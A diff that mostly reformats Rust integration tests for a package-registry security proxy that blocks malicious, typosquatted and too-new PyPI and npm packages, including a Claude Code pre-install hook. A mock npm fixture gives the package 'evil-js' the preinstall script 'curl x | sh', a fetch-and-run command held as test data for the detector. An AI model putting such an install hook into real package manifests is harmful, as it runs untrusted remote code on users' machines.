@@ -32,7 +32,12 @@ struct MockState {
 
 impl MockState {
     fn hit(&self, key: &str) {
-        *self.hits.lock().unwrap().entry(key.to_string()).or_default() += 1;
+        *self
+            .hits
+            .lock()
+            .unwrap()
+            .entry(key.to_string())
+            .or_default() += 1;
     }
     fn hits(&self, key: &str) -> usize {
         self.hits.lock().unwrap().get(key).copied().unwrap_or(0)
@@ -65,7 +70,10 @@ async fn simple_page(State(m): State<Mock>, Path(project): Path<String>) -> Resp
         .filter(|p| p.0 == project)
         .map(|(n, v, _, _)| {
             let f = file_name(n, v);
-            format!(r#"<a href="{}/files/packages/ab/cd/{f}#sha256=00">{f}</a><br/>"#, m.base)
+            format!(
+                r#"<a href="{}/files/packages/ab/cd/{f}#sha256=00">{f}</a><br/>"#,
+                m.base
+            )
         })
         .collect();
     if links.is_empty() {
@@ -91,7 +99,10 @@ fn pypi_file_json(m: &MockState, n: &str, v: &str, t: &str, bytes: &[u8]) -> Val
 }
 
 async fn pypi_json(State(m): State<Mock>, Path(name): Path<String>) -> Response {
-    let pkgs: Vec<_> = pypi_packages().into_iter().filter(|p| p.0 == name).collect();
+    let pkgs: Vec<_> = pypi_packages()
+        .into_iter()
+        .filter(|p| p.0 == name)
+        .collect();
     if pkgs.is_empty() {
         return (StatusCode::NOT_FOUND, Json(json!({"message": "Not Found"}))).into_response();
     }
@@ -103,9 +114,18 @@ async fn pypi_json(State(m): State<Mock>, Path(name): Path<String>) -> Response 
     Json(json!({"info": {"name": name, "version": latest}, "releases": releases})).into_response()
 }
 
-async fn pypi_version_json(State(m): State<Mock>, Path((name, version)): Path<(String, String)>) -> Response {
-    match pypi_packages().into_iter().find(|p| p.0 == name && p.1 == version) {
-        Some((n, v, b, t)) => Json(json!({"info": {"name": n, "version": v}, "urls": [pypi_file_json(&m, n, v, &t, b)]})).into_response(),
+async fn pypi_version_json(
+    State(m): State<Mock>,
+    Path((name, version)): Path<(String, String)>,
+) -> Response {
+    match pypi_packages()
+        .into_iter()
+        .find(|p| p.0 == name && p.1 == version)
+    {
+        Some((n, v, b, t)) => Json(
+            json!({"info": {"name": n, "version": v}, "urls": [pypi_file_json(&m, n, v, &t, b)]}),
+        )
+        .into_response(),
         None => (StatusCode::NOT_FOUND, "{}").into_response(),
     }
 }
@@ -130,10 +150,34 @@ fn npm_packages() -> Vec<(&'static str, &'static str, &'static [u8], String, Val
     let old = "2019-05-01T00:00:00.000Z".to_string();
     let fresh = (Utc::now() - chrono::Duration::hours(1)).to_rfc3339();
     vec![
-        ("@scope/lib", "1.2.3", b"benign scoped", old.clone(), json!({})),
-        ("plainlib", "0.1.0", b"benign plain", old.clone(), json!({"test": "jest"})),
-        ("freshpkg", "1.0.0", b"benign fresh", fresh, json!({"postinstall": "node setup.js"})),
-        ("evil-js", "6.6.6", b"EVIL js", old, json!({"preinstall": "curl x | sh"})),
+        (
+            "@scope/lib",
+            "1.2.3",
+            b"benign scoped",
+            old.clone(),
+            json!({}),
+        ),
+        (
+            "plainlib",
+            "0.1.0",
+            b"benign plain",
+            old.clone(),
+            json!({"test": "jest"}),
+        ),
+        (
+            "freshpkg",
+            "1.0.0",
+            b"benign fresh",
+            fresh,
+            json!({"postinstall": "node setup.js"}),
+        ),
+        (
+            "evil-js",
+            "6.6.6",
+            b"EVIL js",
+            old,
+            json!({"preinstall": "curl x | sh"}),
+        ),
     ]
 }
 
@@ -192,7 +236,12 @@ fn fake_scanner(calls: Arc<AtomicUsize>) -> ScanFn {
         calls.fetch_add(1, Ordering::SeqCst);
         let evil = bytes.windows(4).any(|w| w == b"EVIL");
         let mut features = BTreeMap::new();
-        for f in ["inst_download_exec", "inst_exfil_endpoint", "inst_proc_exec", "inst_network"] {
+        for f in [
+            "inst_download_exec",
+            "inst_exfil_endpoint",
+            "inst_proc_exec",
+            "inst_network",
+        ] {
             features.insert(f.to_string(), if evil { 2.0 } else { 0.0 });
         }
         let mut install_surface = vec!["setup.py".to_string()];
@@ -268,9 +317,14 @@ impl Harness {
         let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
         let base = format!("http://{}", listener.local_addr().unwrap());
         let (tx, rx) = tokio::sync::oneshot::channel::<()>();
-        let server = tokio::spawn(customs::server::serve_on(listener, engine.clone(), ui, async move {
-            let _ = rx.await;
-        }));
+        let server = tokio::spawn(customs::server::serve_on(
+            listener,
+            engine.clone(),
+            ui,
+            async move {
+                let _ = rx.await;
+            },
+        ));
         Self {
             base,
             mock,
@@ -284,7 +338,11 @@ impl Harness {
     }
 
     async fn get(&self, path: &str) -> reqwest::Response {
-        self.http.get(format!("{}{path}", self.base)).send().await.unwrap()
+        self.http
+            .get(format!("{}{path}", self.base))
+            .send()
+            .await
+            .unwrap()
     }
 
     async fn check(&self, eco: &str, name: &str, version: Option<&str>) -> (u16, Value) {
@@ -324,7 +382,13 @@ async fn pypi_simple_page_is_rewritten_and_allowed_file_streams() {
     let page = h.get("/pypi/simple/GoodPkg/").await;
     assert_eq!(page.status(), 200);
     let html = page.text().await.unwrap();
-    assert!(html.contains(&format!("{}/pypi/files/packages/ab/cd/goodpkg-1.0.0.tar.gz#sha256=00", h.base)), "{html}");
+    assert!(
+        html.contains(&format!(
+            "{}/pypi/files/packages/ab/cd/goodpkg-1.0.0.tar.gz#sha256=00",
+            h.base
+        )),
+        "{html}"
+    );
     assert!(!html.contains(&h.mock.base));
 
     let r = h.get(&pypi_file_path("goodpkg", "1.0.0")).await;
@@ -338,7 +402,12 @@ async fn pypi_simple_page_is_rewritten_and_allowed_file_streams() {
     assert_eq!(ev[0]["decision"], "allow");
     assert_eq!(ev[0]["name"], "goodpkg");
     assert_eq!(ev[0]["version"], "1.0.0");
-    let v: Value = h.get(&format!("/api/verdicts/{}", ev[0]["verdict_id"])).await.json().await.unwrap();
+    let v: Value = h
+        .get(&format!("/api/verdicts/{}", ev[0]["verdict_id"]))
+        .await
+        .json()
+        .await
+        .unwrap();
     assert_eq!(v["id"], ev[0]["verdict_id"]);
     assert_eq!(v["artifact"], "goodpkg-1.0.0.tar.gz");
     assert_eq!(v["model_version"], "dev-untrained");
@@ -352,7 +421,12 @@ async fn pypi_simple_page_is_rewritten_and_allowed_file_streams() {
     assert_eq!(h.mock.hits("packages/ab/cd/goodpkg-1.0.0.tar.gz"), 1);
     assert_eq!(h.scans.load(Ordering::SeqCst), 1);
     let ev = h.events().await;
-    let v: Value = h.get(&format!("/api/verdicts/{}", ev[0]["verdict_id"])).await.json().await.unwrap();
+    let v: Value = h
+        .get(&format!("/api/verdicts/{}", ev[0]["verdict_id"]))
+        .await
+        .json()
+        .await
+        .unwrap();
     assert_eq!(v["cached"], true);
     h.stop().await;
 }
@@ -366,13 +440,24 @@ async fn pypi_malicious_file_is_blocked_with_explanation() {
     assert_eq!(reason, Some("Forbidden"));
     assert_eq!(r.headers()["x-customs-decision"], "block");
     let body = r.text().await.unwrap();
-    assert!(body.starts_with("Customs blocked pypi package evilpkg 0.0.1"), "{body}");
-    assert!(body.contains("Downloads and executes a payload at install time"), "{body}");
+    assert!(
+        body.starts_with("Customs blocked pypi package evilpkg 0.0.1"),
+        "{body}"
+    );
+    assert!(
+        body.contains("Downloads and executes a payload at install time"),
+        "{body}"
+    );
     assert!(body.contains("/api/verdicts/"), "{body}");
 
     let ev = h.events().await;
     assert_eq!(ev[0]["decision"], "block");
-    let v: Value = h.get(&format!("/api/verdicts/{}", ev[0]["verdict_id"])).await.json().await.unwrap();
+    let v: Value = h
+        .get(&format!("/api/verdicts/{}", ev[0]["verdict_id"]))
+        .await
+        .json()
+        .await
+        .unwrap();
     assert_eq!(v["model_decision"], "block");
     assert_eq!(v["reasons"][0]["feature"], "inst_download_exec");
     assert_eq!(v["evidence"][0]["file"], "setup.py");
@@ -383,7 +468,9 @@ async fn pypi_malicious_file_is_blocked_with_explanation() {
 async fn raw_reason_phrase_names_the_rule() {
     let h = Harness::start(|p| p.deny = vec!["pypi:goodpkg".into()]).await;
     let path = pypi_file_path("goodpkg", "1.0.0");
-    let mut s = tokio::net::TcpStream::connect(h.base.trim_start_matches("http://")).await.unwrap();
+    let mut s = tokio::net::TcpStream::connect(h.base.trim_start_matches("http://"))
+        .await
+        .unwrap();
     use tokio::io::{AsyncReadExt, AsyncWriteExt};
     s.write_all(format!("GET {path} HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n").as_bytes())
         .await
@@ -392,7 +479,10 @@ async fn raw_reason_phrase_names_the_rule() {
     s.read_to_end(&mut buf).await.unwrap();
     let text = String::from_utf8_lossy(&buf);
     let status_line = text.lines().next().unwrap();
-    assert_eq!(status_line, "HTTP/1.1 403 Blocked by Customs: deny: pypi:goodpkg is on the deny list");
+    assert_eq!(
+        status_line,
+        "HTTP/1.1 403 Blocked by Customs: deny: pypi:goodpkg is on the deny list"
+    );
     h.stop().await;
 }
 
@@ -405,8 +495,16 @@ async fn typosquat_name_is_warned_but_served() {
     let (status, v) = h.check("pypi", "reqeusts", None).await;
     assert_eq!(status, 200);
     assert_eq!(v["decision"], "warn");
-    let labels: Vec<&str> = v["reasons"].as_array().unwrap().iter().map(|r| r["label"].as_str().unwrap()).collect();
-    assert!(labels.contains(&"1 edit from popular package 'requests'"), "{labels:?}");
+    let labels: Vec<&str> = v["reasons"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .map(|r| r["label"].as_str().unwrap())
+        .collect();
+    assert!(
+        labels.contains(&"1 edit from popular package 'requests'"),
+        "{labels:?}"
+    );
     h.stop().await;
 }
 
@@ -416,7 +514,10 @@ async fn new_versions_hit_min_age() {
     let r = h.get(&pypi_file_path("newpkg", "1.0.0")).await;
     assert_eq!(r.status(), 403);
     let body = r.text().await.unwrap();
-    assert!(body.contains("min_age_days: published 2 hours ago (policy: 3 days)"), "{body}");
+    assert!(
+        body.contains("min_age_days: published 2 hours ago (policy: 3 days)"),
+        "{body}"
+    );
     h.stop().await;
 }
 
@@ -442,7 +543,10 @@ async fn npm_packument_rewrite_and_tarballs() {
     let r = h.get("/npm/evil-js/-/evil-js-6.6.6.tgz").await;
     assert_eq!(r.status(), 403);
     let err: Value = r.json().await.unwrap();
-    assert!(err["error"].as_str().unwrap().contains("Customs blocked npm package evil-js 6.6.6"));
+    assert!(err["error"]
+        .as_str()
+        .unwrap()
+        .contains("Customs blocked npm package evil-js 6.6.6"));
 
     // Young package with a postinstall script: blocked by both age rules.
     let r = h.get("/npm/freshpkg/-/freshpkg-1.0.0.tgz").await;
@@ -450,7 +554,10 @@ async fn npm_packument_rewrite_and_tarballs() {
     let err: Value = r.json().await.unwrap();
     let msg = err["error"].as_str().unwrap();
     assert!(msg.contains("min_age_days"), "{msg}");
-    assert!(msg.contains("block_install_scripts_from_new: runs install scripts (postinstall)"), "{msg}");
+    assert!(
+        msg.contains("block_install_scripts_from_new: runs install scripts (postinstall)"),
+        "{msg}"
+    );
 
     let r = h.get("/npm/does-not-exist").await;
     assert_eq!(r.status(), 404);
@@ -465,8 +572,16 @@ async fn warn_only_age_rule_with_install_scripts() {
     let h = Harness::start(|p| p.min_age_severity = customs::config::AgeSeverity::Warn).await;
     let (_, v) = h.check("npm", "freshpkg", None).await;
     assert_eq!(v["decision"], "block");
-    let rules: Vec<&str> = v["policy_hits"].as_array().unwrap().iter().map(|h| h.as_str_rule()).collect();
-    assert_eq!(rules, vec!["min_age_days", "block_install_scripts_from_new"]);
+    let rules: Vec<&str> = v["policy_hits"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .map(|h| h.as_str_rule())
+        .collect();
+    assert_eq!(
+        rules,
+        vec!["min_age_days", "block_install_scripts_from_new"]
+    );
     h.stop().await;
 }
 
@@ -491,7 +606,10 @@ async fn nonexistent_packages() {
     let (status, body) = h.check("pypi", "nope-not-here", None).await;
     assert_eq!(status, 404);
     assert_eq!(body["code"], "nonexistent_package");
-    assert!(body["error"].as_str().unwrap().contains("does not exist on PyPI"));
+    assert!(body["error"]
+        .as_str()
+        .unwrap()
+        .contains("does not exist on PyPI"));
     assert_eq!(body["verdict"]["decision"], "block");
     assert!(body["verdict"]["id"].is_i64());
     h.stop().await;
@@ -527,7 +645,10 @@ async fn concurrent_requests_scan_once() {
         let (http, url) = (h.http.clone(), format!("{}{path}", h.base));
         tasks.push(tokio::spawn(async move {
             let r = http.get(url).send().await.unwrap();
-            let id = r.headers()["x-customs-verdict"].to_str().unwrap().to_string();
+            let id = r.headers()["x-customs-verdict"]
+                .to_str()
+                .unwrap()
+                .to_string();
             (r.status().as_u16(), id, r.bytes().await.unwrap())
         }));
     }
@@ -542,7 +663,10 @@ async fn concurrent_requests_scan_once() {
     assert_eq!(h.scans.load(Ordering::SeqCst), 1);
     assert!(ids.windows(2).all(|w| w[0] == w[1]), "{ids:?}");
     let metrics = h.get("/metrics").await.text().await.unwrap();
-    assert!(metrics.contains("customs_singleflight_joins_total 7"), "{metrics}");
+    assert!(
+        metrics.contains("customs_singleflight_joins_total 7"),
+        "{metrics}"
+    );
     h.stop().await;
 }
 
@@ -555,7 +679,12 @@ async fn monitor_mode_serves_blocked_artifacts() {
     assert_eq!(r.bytes().await.unwrap().as_ref(), b"EVIL archive");
     let ev = h.events().await;
     assert_eq!(ev[0]["decision"], "block");
-    let v: Value = h.get(&format!("/api/verdicts/{}", ev[0]["verdict_id"])).await.json().await.unwrap();
+    let v: Value = h
+        .get(&format!("/api/verdicts/{}", ev[0]["verdict_id"]))
+        .await
+        .json()
+        .await
+        .unwrap();
     assert_eq!(v["mode"], "monitor");
     h.stop().await;
 }
@@ -569,7 +698,11 @@ async fn sse_delivers_events() {
     let mut buf = String::new();
     let deadline = tokio::time::Instant::now() + Duration::from_secs(5);
     while !buf.contains("\n\n") {
-        let chunk = tokio::time::timeout_at(deadline, stream.chunk()).await.expect("no SSE frame").unwrap().unwrap();
+        let chunk = tokio::time::timeout_at(deadline, stream.chunk())
+            .await
+            .expect("no SSE frame")
+            .unwrap()
+            .unwrap();
         buf.push_str(&String::from_utf8_lossy(&chunk));
     }
     assert!(buf.starts_with("event: install\n"), "{buf}");
@@ -590,7 +723,13 @@ async fn policy_api_validates_and_persists() {
     assert_eq!(p["warn_threshold"], "model");
     p["deny"] = json!(["pypi:goodpkg"]);
     p["block_threshold"] = json!(0.8);
-    let r = h.http.put(format!("{}/api/policy", h.base)).json(&p).send().await.unwrap();
+    let r = h
+        .http
+        .put(format!("{}/api/policy", h.base))
+        .json(&p)
+        .send()
+        .await
+        .unwrap();
     assert_eq!(r.status(), 200);
     let saved = std::fs::read_to_string(h.engine.policy_path()).unwrap();
     assert!(saved.contains("block_threshold = 0.8"), "{saved}");
@@ -599,7 +738,13 @@ async fn policy_api_validates_and_persists() {
     assert_eq!(r.status(), 403);
 
     p["warn_threshold"] = json!(1.5);
-    let r = h.http.put(format!("{}/api/policy", h.base)).json(&p).send().await.unwrap();
+    let r = h
+        .http
+        .put(format!("{}/api/policy", h.base))
+        .json(&p)
+        .send()
+        .await
+        .unwrap();
     assert_eq!(r.status(), 400);
     let e: Value = r.json().await.unwrap();
     assert_eq!(e["errors"][0]["field"], "warn_threshold");
@@ -623,14 +768,34 @@ async fn events_filters_stats_model_metrics_health() {
     h.get(&pypi_file_path("goodpkg", "1.0.0")).await;
     h.get(&pypi_file_path("evilpkg", "0.0.1")).await;
     h.get("/npm/plainlib/-/plainlib-0.1.0.tgz").await;
-    let ev: Vec<Value> = h.get("/api/events?decision=block").await.json().await.unwrap();
+    let ev: Vec<Value> = h
+        .get("/api/events?decision=block")
+        .await
+        .json()
+        .await
+        .unwrap();
     assert_eq!(ev.len(), 1);
     assert_eq!(ev[0]["name"], "evilpkg");
-    let ev: Vec<Value> = h.get("/api/events?ecosystem=npm").await.json().await.unwrap();
+    let ev: Vec<Value> = h
+        .get("/api/events?ecosystem=npm")
+        .await
+        .json()
+        .await
+        .unwrap();
     assert_eq!(ev.len(), 1);
-    let ev: Vec<Value> = h.get("/api/events?q=PKG&limit=1").await.json().await.unwrap();
+    let ev: Vec<Value> = h
+        .get("/api/events?q=PKG&limit=1")
+        .await
+        .json()
+        .await
+        .unwrap();
     assert_eq!(ev.len(), 1);
-    let older: Vec<Value> = h.get(&format!("/api/events?q=pkg&before={}", ev[0]["id"])).await.json().await.unwrap();
+    let older: Vec<Value> = h
+        .get(&format!("/api/events?q=pkg&before={}", ev[0]["id"]))
+        .await
+        .json()
+        .await
+        .unwrap();
     assert_eq!(older.len(), 1);
     assert_eq!(older[0]["name"], "goodpkg");
 
@@ -651,7 +816,11 @@ async fn events_filters_stats_model_metrics_health() {
     assert_eq!(m["components"]["code_gbdt"]["loaded"], true);
 
     let metrics = h.get("/metrics").await.text().await.unwrap();
-    assert!(metrics.contains(r#"customs_http_requests_total{route="/pypi/files/{*path}",status="403"} 1"#), "{metrics}");
+    assert!(
+        metrics
+            .contains(r#"customs_http_requests_total{route="/pypi/files/{*path}",status="403"} 1"#),
+        "{metrics}"
+    );
     assert!(metrics.contains(r#"customs_verdicts_total{decision="block",ecosystem="pypi"} 1"#));
     assert!(metrics.contains("customs_scan_duration_seconds_count 3"));
     assert!(metrics.contains(r#"customs_upstream_fetch_duration_seconds_count{kind="artifact"} 3"#));
@@ -673,7 +842,10 @@ async fn cors_allows_only_the_vite_dev_origin() {
         .send()
         .await
         .unwrap();
-    assert_eq!(r.headers()["access-control-allow-origin"], "http://localhost:5173");
+    assert_eq!(
+        r.headers()["access-control-allow-origin"],
+        "http://localhost:5173"
+    );
     let r = h
         .http
         .get(format!("{}/api/stats", h.base))
@@ -698,7 +870,10 @@ async fn dashboard_serving() {
     std::fs::write(ui.path().join("assets/app.js"), "console.log(1)").unwrap();
     let h = Harness::start_with_ui(|_| {}, Some(ui.path().to_path_buf())).await;
     assert_eq!(h.get("/").await.text().await.unwrap(), "<html>SPA</html>");
-    assert_eq!(h.get("/assets/app.js").await.text().await.unwrap(), "console.log(1)");
+    assert_eq!(
+        h.get("/assets/app.js").await.text().await.unwrap(),
+        "console.log(1)"
+    );
     let r = h.get("/verdicts/12").await;
     assert_eq!(r.status(), 200);
     assert_eq!(r.text().await.unwrap(), "<html>SPA</html>");
@@ -706,7 +881,12 @@ async fn dashboard_serving() {
 }
 
 /// Run the real binary as Claude Code would.
-fn run_hook(server: &str, command: &str, cwd: &std::path::Path, extra: &[&str]) -> (String, String, i32) {
+fn run_hook(
+    server: &str,
+    command: &str,
+    cwd: &std::path::Path,
+    extra: &[&str],
+) -> (String, String, i32) {
     use std::io::Write;
     use std::process::{Command, Stdio};
     let input = json!({
@@ -727,7 +907,12 @@ fn run_hook(server: &str, command: &str, cwd: &std::path::Path, extra: &[&str]) 
         .stderr(Stdio::piped())
         .spawn()
         .unwrap();
-    child.stdin.take().unwrap().write_all(input.to_string().as_bytes()).unwrap();
+    child
+        .stdin
+        .take()
+        .unwrap()
+        .write_all(input.to_string().as_bytes())
+        .unwrap();
     let out = child.wait_with_output().unwrap();
     (
         String::from_utf8_lossy(&out.stdout).into_owned(),
@@ -740,15 +925,34 @@ fn run_hook(server: &str, command: &str, cwd: &std::path::Path, extra: &[&str]) 
 async fn claude_code_hook_end_to_end() {
     let h = Harness::start(|_| {}).await;
     let dir = tempfile::tempdir().unwrap();
-    std::fs::write(dir.path().join("requirements.txt"), "goodpkg==1.0.0\nevilpkg\n").unwrap();
+    std::fs::write(
+        dir.path().join("requirements.txt"),
+        "goodpkg==1.0.0\nevilpkg\n",
+    )
+    .unwrap();
     let base = h.base.clone();
     let cwd = dir.path().to_path_buf();
     let results = tokio::task::spawn_blocking(move || {
         vec![
-            run_hook(&base, "cd /x && FOO=1 pip install 'evilpkg==0.0.1'", &cwd, &[]),
-            run_hook(&base, "pip install goodpkg && npm i @scope/lib@^1", &cwd, &[]),
+            run_hook(
+                &base,
+                "cd /x && FOO=1 pip install 'evilpkg==0.0.1'",
+                &cwd,
+                &[],
+            ),
+            run_hook(
+                &base,
+                "pip install goodpkg && npm i @scope/lib@^1",
+                &cwd,
+                &[],
+            ),
             run_hook(&base, "pip install reqeusts", &cwd, &[]),
-            run_hook(&base, "python -m pip install -r requirements.txt", &cwd, &[]),
+            run_hook(
+                &base,
+                "python -m pip install -r requirements.txt",
+                &cwd,
+                &[],
+            ),
             run_hook(&base, "pip install nope-not-here", &cwd, &[]),
             run_hook(&base, "git status", &cwd, &[]),
         ]
@@ -762,18 +966,33 @@ async fn claude_code_hook_end_to_end() {
     let d = decision(out);
     assert_eq!(d["hookSpecificOutput"]["hookEventName"], "PreToolUse");
     assert_eq!(d["hookSpecificOutput"]["permissionDecision"], "deny");
-    let reason = d["hookSpecificOutput"]["permissionDecisionReason"].as_str().unwrap();
+    let reason = d["hookSpecificOutput"]["permissionDecisionReason"]
+        .as_str()
+        .unwrap();
     assert!(reason.contains("pypi:evilpkg 0.0.1"), "{reason}");
-    assert!(reason.contains("Downloads and executes a payload"), "{reason}");
+    assert!(
+        reason.contains("Downloads and executes a payload"),
+        "{reason}"
+    );
 
-    assert_eq!(results[1].0.trim(), "", "allowed installs print nothing: {:?}", results[1]);
+    assert_eq!(
+        results[1].0.trim(),
+        "",
+        "allowed installs print nothing: {:?}",
+        results[1]
+    );
     assert_eq!(results[1].2, 0);
 
-    assert_eq!(decision(&results[2].0)["hookSpecificOutput"]["permissionDecision"], "ask");
+    assert_eq!(
+        decision(&results[2].0)["hookSpecificOutput"]["permissionDecision"],
+        "ask"
+    );
     let d = decision(&results[3].0);
     assert_eq!(d["hookSpecificOutput"]["permissionDecision"], "deny");
     let d = decision(&results[4].0);
-    let reason = d["hookSpecificOutput"]["permissionDecisionReason"].as_str().unwrap();
+    let reason = d["hookSpecificOutput"]["permissionDecisionReason"]
+        .as_str()
+        .unwrap();
     assert!(reason.contains("does not exist on PyPI"), "{reason}");
     assert_eq!(results[5].0, "");
 
@@ -796,8 +1015,18 @@ async fn hook_failure_modes() {
     let cfg = dir.path().join("customs.toml").display().to_string();
     let cwd = dir.path().to_path_buf();
     let (open, closed, garbage) = tokio::task::spawn_blocking(move || {
-        let open = run_hook("http://127.0.0.1:9", "pip install anything", &cwd, &["--config", &cfg]);
-        let closed = run_hook("http://127.0.0.1:9", "pip install anything", &cwd, &["--config", &cfg, "--fail-closed"]);
+        let open = run_hook(
+            "http://127.0.0.1:9",
+            "pip install anything",
+            &cwd,
+            &["--config", &cfg],
+        );
+        let closed = run_hook(
+            "http://127.0.0.1:9",
+            "pip install anything",
+            &cwd,
+            &["--config", &cfg, "--fail-closed"],
+        );
         let garbage = {
             use std::io::Write;
             use std::process::{Command, Stdio};
@@ -810,7 +1039,11 @@ async fn hook_failure_modes() {
                 .unwrap();
             c.stdin.take().unwrap().write_all(b"{not json").unwrap();
             let o = c.wait_with_output().unwrap();
-            (String::from_utf8_lossy(&o.stdout).into_owned(), String::from_utf8_lossy(&o.stderr).into_owned(), o.status.code().unwrap())
+            (
+                String::from_utf8_lossy(&o.stdout).into_owned(),
+                String::from_utf8_lossy(&o.stderr).into_owned(),
+                o.status.code().unwrap(),
+            )
         };
         (open, closed, garbage)
     })
@@ -837,7 +1070,10 @@ async fn cli_check_uses_running_server() {
                 .args(["--server", &base])
                 .output()
                 .unwrap();
-            (String::from_utf8_lossy(&o.stdout).into_owned(), o.status.code().unwrap())
+            (
+                String::from_utf8_lossy(&o.stdout).into_owned(),
+                o.status.code().unwrap(),
+            )
         };
         vec![
             run(&["check", "pypi", "evilpkg==0.0.1"]),
@@ -848,7 +1084,11 @@ async fn cli_check_uses_running_server() {
     .await
     .unwrap();
     assert_eq!(out[0].1, 3, "{}", out[0].0);
-    assert!(out[0].0.starts_with("pypi evilpkg 0.0.1  BLOCK"), "{}", out[0].0);
+    assert!(
+        out[0].0.starts_with("pypi evilpkg 0.0.1  BLOCK"),
+        "{}",
+        out[0].0
+    );
     assert_eq!(out[1].1, 0);
     let v: Value = serde_json::from_str(&out[1].0).unwrap();
     assert_eq!(v["name"], "@scope/lib");
@@ -865,8 +1105,9 @@ fn dev_models_flag_typosquats() {
     assert!(s.prob > 0.5);
     let s = m.score_name(Ecosystem::Pypi, "requests").unwrap();
     assert!(s.prob < 0.01);
-    let s = m.score_name(Ecosystem::Npm, "@bable/core").unwrap();
-    assert!(s.features.scope_squat.is_some());
+    let s = m.score_name(Ecosystem::Npm, "@evil/expres").unwrap();
+    assert_eq!(s.features.nearest_popular.as_deref(), Some("express"));
+    assert!(s.prob > 0.5);
 }
 
 /// Live registries. Run with `cargo test -p customs -- --ignored`.
@@ -884,15 +1125,29 @@ async fn live_registries() {
         metrics: Arc::new(Metrics::new()),
     })
     .unwrap();
-    let v = engine.check(Ecosystem::Pypi, "requests", Some("2.32.3"), None).await.unwrap();
+    let v = engine
+        .check(Ecosystem::Pypi, "requests", Some("2.32.3"), None)
+        .await
+        .unwrap();
     assert_eq!(v.artifact.as_deref(), Some("requests-2.32.3.tar.gz"));
     assert_eq!(v.decision, customs_model::Decision::Allow);
-    let v = engine.check(Ecosystem::Npm, "left-pad", None, None).await.unwrap();
+    let v = engine
+        .check(Ecosystem::Npm, "left-pad", None, None)
+        .await
+        .unwrap();
     assert_eq!(v.version.as_deref(), Some("1.3.0"));
-    let v = engine.check(Ecosystem::Npm, "@babel/core", Some("^7"), None).await.unwrap();
+    let v = engine
+        .check(Ecosystem::Npm, "@babel/core", Some("^7"), None)
+        .await
+        .unwrap();
     assert!(v.version.unwrap().starts_with("7."));
     let v = engine
-        .check(Ecosystem::Pypi, "this-package-should-not-exist-customs-test", None, None)
+        .check(
+            Ecosystem::Pypi,
+            "this-package-should-not-exist-customs-test",
+            None,
+            None,
+        )
         .await
         .unwrap();
     assert_eq!(v.decision, customs_model::Decision::Block);
